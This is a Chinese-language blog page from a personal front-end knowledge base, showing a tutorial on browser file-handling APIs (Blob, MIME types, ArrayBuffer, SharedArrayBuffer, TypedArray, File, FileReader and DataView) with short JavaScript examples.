<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.1">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"catcherinsky.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="CatcherInSky的前端知识库">
<meta property="og:type" content="website">
<meta property="og:title" content="Knowlegde Bases of CatcherInSky">
<meta property="og:url" content="http://catcherinsky.github.io/page/4/index.html">
<meta property="og:site_name" content="Knowlegde Bases of CatcherInSky">
<meta property="og:description" content="CatcherInSky的前端知识库">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="CatcherInSky">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://catcherinsky.github.io/page/4/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-CN'
  };
</script>

  <title>Knowlegde Bases of CatcherInSky</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

<!-- hexo injector head_end start -->
  <meta name="referrer" content="same-origin">
<!-- hexo injector head_end end --></head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Knowlegde Bases of CatcherInSky</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">CatcherInSky的前端知识库</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://catcherinsky.github.io/2021/09/17/%E5%89%8D%E7%AB%AF%E6%96%87%E4%BB%B6%E5%A4%84%E7%90%86/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="CatcherInSky">
      <meta itemprop="description" content="CatcherInSky的前端知识库">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Knowlegde Bases of CatcherInSky">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/09/17/%E5%89%8D%E7%AB%AF%E6%96%87%E4%BB%B6%E5%A4%84%E7%90%86/" class="post-title-link" itemprop="url">前端文件处理</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-09-17 15:47:49" itemprop="dateCreated datePublished" datetime="2021-09-17T15:47:49+08:00">2021-09-17</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-02-14 19:41:04" itemprop="dateModified" datetime="2022-02-14T19:41:04+08:00">2022-02-14</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="文件对象"><a href="#文件对象" class="headerlink" title="文件对象"></a>文件对象</h2><h3 id="Blob"><a href="#Blob" class="headerlink" title="Blob"></a>Blob</h3><p>Blob 对象表示一个<strong>不可变</strong>、原始数据的类文件对象。它的数据可以按文本或二进制的格式进行读取。可以用于数据传输。</p>
<ul>
<li>size Blob 对象包含数据的字节数</li>
<li>type Blob 对象的 MIME 类型</li>
</ul>
<h4 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h4><p><strong>slice( [ start [ , end [ , contentType ] ] ] )</strong><br>返回一个新的 Blob 对象，包含了源 Blob 对象中指定范围内的数据，可实现数据分片<br>​</p>
<p><strong>stream</strong><br>返回一个能读取 blob 内容的 ReadableStream<br>​</p>
<p><strong>text</strong><br>返回一个 promise 且包含 blob 所有内容的 UTF-8 格式的 USVString<br>​</p>
<p><strong>arrayBuffer</strong><br>返回一个 promise 且包含 blob 所有内容的二进制格式的 ArrayBuffer</p>
<h4 id="构造函数"><a href="#构造函数" class="headerlink" title="构造函数"></a>构造函数</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> blob = <span class="keyword">new</span> <span class="title class_">Blob</span>(array, options);</span><br></pre></td></tr></table></figure>

<ul>
<li>array 是一个由 ArrayBuffer, TypedArray, Blob, DOMString 等对象构成的 Array</li>
<li>options 是一个可选的 BlobPropertyBag 字典<ul>
<li>type 数组内容的 MIME 类型</li>
<li>endings 用于指定包含行结束符\n 的字符串如何被写入。 它是以下两个值中的一个： “native”，代表行结束符会被更改为适合宿主操作系统文件系统的换行符，或者 “transparent”默认（），代表会保持 blob 中保存的结束符不变</li>
</ul>
</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">Blob</span>([<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123; <span class="attr">hello</span>: <span class="string">&quot;world&quot;</span> &#125;, <span class="literal">null</span>, <span class="number">2</span>)], &#123;</span><br><span class="line">  <span class="attr">type</span>: <span class="string">&quot;application/json&quot;</span>,</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Blob</span>([<span class="string">&quot;&lt;div&gt;Hello World&lt;/div&gt;&quot;</span>], &#123; <span class="attr">type</span>: <span class="string">&quot;text/xml&quot;</span> &#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Blob</span>([typedArray.<span class="property">buffer</span>], &#123; <span class="attr">type</span>: <span class="string">&quot;application/octet-stream&quot;</span> &#125;);</span><br></pre></td></tr></table></figure>

<h4 id="MIME-类型"><a href="#MIME-类型" class="headerlink" title="MIME 类型"></a>MIME 类型</h4><p>媒体类型（Multipurpose Internet Mail Extensions）是一种标准，用来表示文档、文件或字节流的性质和格式。具体文件类型看在<a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/MIME_types/Common_types.">这里</a>查看：</p>
<ul>
<li>text/plain<ul>
<li>文本文件默认值。即使它意味着未知的文本文件，但浏览器认为是可以直接展示的。</li>
</ul>
</li>
<li>text/[css. html. javascript]<ul>
<li>css, html, js 文件</li>
</ul>
</li>
<li>text/csv<ul>
<li>csv 表格</li>
</ul>
</li>
<li>image/[gif, jpeg, png, svg+xml]<ul>
<li>图片类型</li>
</ul>
</li>
<li>audio/[wave, wav, x-wav, x-pn-wav, webm, ogg]<ul>
<li>音频类型</li>
</ul>
</li>
<li>video/[webm/ogg]<ul>
<li>视频类型</li>
</ul>
</li>
<li>application/octet-stream<ul>
<li>这是应用程序文件的默认值。意思是 未知的应用程序文件</li>
</ul>
</li>
<li>application/json<ul>
<li>JSON 文件</li>
</ul>
</li>
<li>application/xml<ul>
<li>xml 文件</li>
</ul>
</li>
<li>application/pdf<ul>
<li>PDF 文档</li>
</ul>
</li>
<li>application/[msword, vnd.openxmlformats-officedocument.wordprocessingml.document]<ul>
<li>doc, docx 文档</li>
</ul>
</li>
<li>application/[vnd.ms-excel, vnd.openxmlformats-officedocument.spreadsheetml.sheet]<ul>
<li>xls, xlsx 表格</li>
</ul>
</li>
<li>multipart/form-data<ul>
<li>用于 HTML 表单从浏览器发送信息给服务器。</li>
</ul>
</li>
</ul>
<h3 id="ArrayBuffer"><a href="#ArrayBuffer" class="headerlink" title="ArrayBuffer"></a>ArrayBuffer</h3><p>ArrayBuffer 对象用来表示通用的、<strong>固定长度</strong>的原始二进制数据缓冲区。可以作为 TypedArray 的引用数据。</p>
<ul>
<li>byteLength 缓冲区的字节数大小</li>
</ul>
<h4 id="方法-1"><a href="#方法-1" class="headerlink" title="方法"></a>方法</h4><p><strong>slice(begin[, end])</strong><br>返回一个新的 ArrayBuffer ，它的内容是原 ArrayBuffer 的字节副本，从 begin（包括），到 end（不包括）</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 复制</span></span><br><span class="line"><span class="keyword">var</span> buf1 = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">var</span> buf2 = buf1.<span class="title function_">slice</span>(<span class="number">0</span>);</span><br></pre></td></tr></table></figure>

<h4 id="构造函数-1"><a href="#构造函数-1" class="headerlink" title="构造函数"></a>构造函数</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建一个固定8字节大小的缓冲区，内容初始化为0</span></span><br><span class="line"><span class="keyword">const</span> buffer = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line"><span class="comment">// 00000000</span></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Int32Array</span>(buffer);</span><br></pre></td></tr></table></figure>

<h4 id="构造函数方法"><a href="#构造函数方法" class="headerlink" title="构造函数方法"></a>构造函数方法</h4><p><strong>ArrayBuffer.isView(data)</strong><br>检查 data 是否是 ArrayBuffer 的视图实例，如 TypedArray 对象或 DataView 对象</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> buffer = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">var</span> view = <span class="keyword">new</span> <span class="title class_">Int32Array</span>(buffer);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">ArrayBuffer</span>.<span class="title function_">isView</span>(view));</span><br><span class="line"><span class="comment">// true</span></span><br></pre></td></tr></table></figure>

<p><strong>ArrayBuffer.transfer(oldBuffer [, newByteLength])</strong><br>返回一个新的 ArrayBuffer 对象，其内容取自 oldBuffer 中的数据，并且根据 newByteLength 的大小对数据进行截取或补 0。<br>​</p>
<p>​</p>
<h3 id="SharedArrayBuffer"><a href="#SharedArrayBuffer" class="headerlink" title="SharedArrayBuffer"></a>SharedArrayBuffer</h3><p>SharedArrayBuffer 对象用来表示一个通用的，固定长度的原始二进制数据缓冲区。用于共享内存，可以提高在 worker 之间的消息传递速度。<br>经过 postMessage 来发送消息，经过 onmessage 来监听消息。但在传输前后都会经过序列和反序列化，降低传输效率</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> w = <span class="keyword">new</span> <span class="title class_">Worker</span>(<span class="string">&quot;myworker.js&quot;</span>);</span><br><span class="line"></span><br><span class="line">w.<span class="title function_">postMessage</span>(<span class="string">&quot;hi&quot;</span>); <span class="comment">// send &quot;hi&quot; to the worker</span></span><br><span class="line">w.<span class="property">onmessage</span> = <span class="keyword">function</span> (<span class="params">ev</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(ev.<span class="property">data</span>); <span class="comment">// prints &quot;ho&quot;</span></span><br><span class="line">&#125;;</span><br><span class="line">onmessage = <span class="keyword">function</span> (<span class="params">ev</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(ev.<span class="property">data</span>); <span class="comment">// prints &quot;hi&quot;</span></span><br><span class="line">  <span class="title function_">postMessage</span>(<span class="string">&quot;ho&quot;</span>); <span class="comment">// sends &quot;ho&quot; back to the creator</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>而 SharedArrayBuffer 消息并无进行序列化或者转换，都使用的是共享内存。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">w.<span class="title function_">postMessage</span>(<span class="keyword">new</span> <span class="title class_">SharedArrayBuffer</span>(<span class="number">1024</span>)); <span class="comment">// 1KiB shared memory</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> sab;</span><br><span class="line">onmessage = <span class="keyword">function</span> (<span class="params">ev</span>) &#123;</span><br><span class="line">  sab = ev.<span class="property">data</span>; <span class="comment">// 1KiB shared memory, the same memory as in the parent</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>​</p>
<h3 id="TypedArray"><a href="#TypedArray" class="headerlink" title="TypedArray"></a>TypedArray</h3><p>一个类型化数组（TypedArray）对象描述了一个底层的二进制数据缓冲区（binary data buffer）的一个类数组视图（<strong>view</strong>）。TypedArray 指的是以下的其中之一：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Int8Array</span>, <span class="title class_">Int16Array</span>, <span class="title class_">Int32Array</span>, <span class="comment">// _位二进制有符号整数</span></span><br><span class="line"><span class="title class_">Uint8Array</span>, <span class="title class_">Uint16Array</span>, <span class="title class_">Uint32Array</span>, <span class="comment">// _位无符号整数</span></span><br><span class="line"><span class="title class_">Uint8ClampedArray</span>, <span class="comment">// 8位无符号整数，超出范围为边界值</span></span><br><span class="line"><span class="title class_">Float32Array</span>, <span class="title class_">Float64Array</span>, <span class="comment">// _位IEEE浮点数</span></span><br><span class="line"><span class="title class_">BigInt64Array</span>, <span class="comment">// 64位二进制有符号整数</span></span><br><span class="line"><span class="title class_">BigUint64Array</span>, <span class="comment">// 64位无符号整数</span></span><br></pre></td></tr></table></figure>

<ul>
<li>BYTES_PER_ELEMENT 每个元素字节数</li>
<li>length 元素格式</li>
<li>name 具体构造器名称（数据格式类型）</li>
<li>buffer 类型数组引用的 ArrayBuffer 只读</li>
<li>byteLength 字节数</li>
<li>byteOffset 起始位置偏移量</li>
</ul>
<h4 id="方法-2"><a href="#方法-2" class="headerlink" title="方法"></a>方法</h4><p>可以用很多数组方法，当做数组一样操作<br>TypedArray 常见操作：<br>修改</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">Uint8Array</span>(<span class="number">10</span>)[<span class="number">0</span>] = <span class="number">1</span>; <span class="comment">// [1, 0, 0, 0, 0, 0, 0, 0, 0, 0]</span></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Uint8Array</span>(<span class="number">10</span>).<span class="title function_">fill</span>(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Uint8Array</span>(<span class="number">10</span>).<span class="title function_">sort</span>(<span class="function">() =&gt;</span> &#123;&#125;);</span><br></pre></td></tr></table></figure>

<p>内部复制</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> uint8 = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>])</span><br><span class="line">  <span class="comment">// (insert position, start position, end position)</span></span><br><span class="line">  .<span class="title function_">copyWithin</span>(<span class="number">3</span>, <span class="number">1</span>, <span class="number">3</span>); <span class="comment">// :Uint8Array [1, 2, 3, 2, 3, 6, 7, 8]</span></span><br></pre></td></tr></table></figure>

<p>截取</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">Uint8Array</span>(<span class="number">10</span>).<span class="title function_">slice</span>(<span class="number">2</span>, <span class="number">3</span>);</span><br></pre></td></tr></table></figure>

<p>拼接</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> data = [<span class="keyword">new</span> <span class="title class_">Uint8Array</span>(<span class="number">10</span>), <span class="keyword">new</span> <span class="title class_">Uint8Array</span>(<span class="number">6</span>)];</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">joinTypedArray</span> = (<span class="params">data</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> joinData = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>(</span><br><span class="line">    data.<span class="title function_">reduce</span>(<span class="function">(<span class="params">acc, cur</span>) =&gt;</span> acc + cur.<span class="property">length</span>, <span class="number">0</span>)</span><br><span class="line">  );</span><br><span class="line">  <span class="keyword">let</span> offset = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; data.<span class="property">length</span>; i++) &#123;</span><br><span class="line">    joinData.<span class="title function_">set</span>(data[i], offset);</span><br><span class="line">    offset += data[i].<span class="property">length</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> joinData;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h4 id="构造函数-2"><a href="#构造函数-2" class="headerlink" title="构造函数"></a>构造函数</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">TypedArray</span>(); <span class="comment">// ES2017中新增</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">TypedArray</span>(length);</span><br><span class="line"><span class="comment">// 当传入 length 参数时，一个内部的数组缓冲区会被创建在内存中。length 指元素数量，内部缓存区的大小（类型化数组中 byteLength 属性的值）是传入的 length 乘以数组中每个元素的字节数</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">TypedArray</span>(typedArray);</span><br><span class="line"><span class="comment">// 传入其他格式的typedArray会转化为新类型的数组。新的生成的类型化数组对象将会有跟传入的数组相同的长度（比如原来的类型化数组的 length==2，那么新生成的数组的 length 也是 2，只是数组中的每一项进行了转化）</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">TypedArray</span>(object);</span><br><span class="line"><span class="comment">// 当传入一个 object 作为参数时，就像通过 TypedArray.from() 方法创建一个新的类型化数组一样</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">TypedArray</span>(buffer [, byteOffset [, length]]);</span><br><span class="line"><span class="comment">// 传入ArrayBuffer实例，会创建一个类型化数组视图。</span></span><br><span class="line"><span class="comment">// - length 参数指定了buffer在类型化数组视图中将要暴露的内存范围。</span></span><br><span class="line"><span class="comment">// - byteOffset 参数指定了buffer的偏移量</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="构造函数方法-1"><a href="#构造函数方法-1" class="headerlink" title="构造函数方法"></a>构造函数方法</h4><p><strong>TypedArray.from()</strong><br>类似 Array.from()<br><strong>TypedArray.of()</strong><br>类似 Array.of()<br>​</p>
<h3 id="转化关系"><a href="#转化关系" class="headerlink" title="转化关系"></a>转化关系</h3><p>blob 用于传输数据，跟 File、FileReader、网络等对象挂钩，不能直接修改，通常处理文件数据的起点和终点都是 blob 格式<br>在读取 blob 的过程中会指定一块内存区域存放数据，就是 ArrayBuffer<br>ArrayBuffer 指定的内存区域，不能直接修改，不同 TypedArray 是对同一块 ArrayBuffer 的不同读取格式<br>可以借助 TypedArray，DataView 或者进一步转换成 Array 对数据进行修改操作<br>Blob &lt;—&gt; ArrayBuffer &lt;—&gt; TypeArray &lt;—&gt; Array</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Blob | ArrayBuffer</span></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Blob</span>([<span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">32</span>)]);</span><br><span class="line"><span class="keyword">await</span> <span class="keyword">new</span> <span class="title class_">Blob</span>().<span class="title function_">arrayBuffer</span>();</span><br><span class="line"><span class="comment">// new FileReader().readAssArrayBuffer(new Blob())</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ArrayBuffer | TypedArray</span></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Uint8Array</span>().<span class="property">buffer</span>;</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Unit8Array</span>(<span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">32</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// Other TypedArray</span></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Uint32Array</span>(<span class="keyword">new</span> <span class="title class_">Uint8Array</span>(<span class="number">10</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// TypedArray | Array</span></span><br><span class="line"><span class="title class_">Array</span>.<span class="title function_">from</span>(<span class="keyword">new</span> <span class="title class_">Uint8Array</span>(<span class="number">10</span>));</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Unit8Array</span>(<span class="keyword">new</span> <span class="title class_">Array</span>());</span><br></pre></td></tr></table></figure>

<h2 id="相关对象"><a href="#相关对象" class="headerlink" title="相关对象"></a>相关对象</h2><h3 id="File"><a href="#File" class="headerlink" title="File"></a>File</h3><p>File 对象提供有关文件的信息，并允许网页中的 JavaScript 访问其内容，是 Blob 的子类。<br>通常情况下， File 对象是来自用户在一个 <input> 元素上选择文件后返回的 FileList 对象,也可以是来自由拖放操作生成的 DataTransfer 对象，或者来自 HTMLCanvasElement 上的 mozGetAsFile() API。<br>File 对象是特殊类型的 Blob，且可以用在任意的 Blob 类型的 context 中。</p>
<ul>
<li>lastModified File 对象引用文件最后修改时间</li>
<li>name 引用文件名称</li>
<li>size File 的大小</li>
<li>type 文件的 MIME 类型</li>
</ul>
<p>​</p>
<h3 id="FileReader"><a href="#FileReader" class="headerlink" title="FileReader"></a>FileReader</h3><p>FileReader 对象允许 Web 应用程序异步读取存储在用户计算机上的文件（或原始数据缓冲区）的内容，使用 File 或 Blob 对象指定要读取的文件或数据。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> reader = <span class="keyword">new</span> <span class="title class_">FileReader</span>();</span><br><span class="line">reader.<span class="title function_">addEventListener</span>(<span class="string">&quot;loadend&quot;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="comment">// reader.result 包含被转化为类型数组 typed array 的 blob</span></span><br><span class="line">&#125;);</span><br><span class="line">reader.<span class="title function_">readAsArrayBuffer</span>(blob);</span><br></pre></td></tr></table></figure>

<ul>
<li>readyState 0 未加载 | 1 正在加载 | 2 已完成</li>
<li>result 文件内容，读取完成后才生效</li>
</ul>
<h4 id="方法-3"><a href="#方法-3" class="headerlink" title="方法"></a>方法</h4><ul>
<li><strong>abort</strong><ul>
<li>中断读取操作</li>
</ul>
</li>
<li><strong>readAsArrayBuffer</strong><ul>
<li>读取指定 blob 的内容，完成后文件的 ArrayBuffer 数据对象被保存在 result 中</li>
</ul>
</li>
<li><strong>readAsBinaryString</strong><ul>
<li>读取指定 blob 的内容，完成后文件的二进制数据被保存在 result 中</li>
</ul>
</li>
<li><strong>readAsDataURL</strong><ul>
<li>读取指定 blob 的内容，完成后文件的 data: URL 格式的 Base64 字符串数据被保存在 result 中</li>
</ul>
</li>
<li><strong>readAsText</strong><ul>
<li>读取指定 blob 的内容，完成后文件的文本数据被保存在 result 中</li>
</ul>
</li>
</ul>
<p>​</p>
<h4 id="事件"><a href="#事件" class="headerlink" title="事件"></a>事件</h4><ul>
<li>**onabort **<ul>
<li>被中断时触发</li>
</ul>
</li>
<li><strong>onerror</strong><ul>
<li>读取错误时触发</li>
</ul>
</li>
<li><strong>onload</strong><ul>
<li>读取完成时触发</li>
</ul>
</li>
<li><strong>onloadstart</strong><ul>
<li>读取开始时触发</li>
</ul>
</li>
<li><strong>onloadend</strong><ul>
<li>读取结束（成功或失败）时触发</li>
</ul>
</li>
<li><strong>onprogress</strong><ul>
<li>progress 事件时触发</li>
</ul>
</li>
</ul>
<h3 id="DataView"><a href="#DataView" class="headerlink" title="DataView"></a>DataView</h3><p>DataView 对象是可以从 ArrayBuffer 对象中读写多种数值类型的底层接口。可以当作一个二进制字节缓存区 array buffer 的“解释器”——它知道如何在读取或写入时正确地转换字节码。这意味着它能在二进制层面处理整数与浮点转化、字节顺序等其他有关的细节问题。<br>​</p>
<h4 id="构造函数-3"><a href="#构造函数-3" class="headerlink" title="构造函数"></a>构造函数</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">DataView</span>(buffer [, byteOffset [, byteLength]])</span><br></pre></td></tr></table></figure>

<ul>
<li>buffer ArrayBuffer 或 SharedArrayBuffer 对象，是 DataView 对象的数据源</li>
<li>byteOffset 数据偏移量</li>
<li>byteLength 字节长度</li>
</ul>
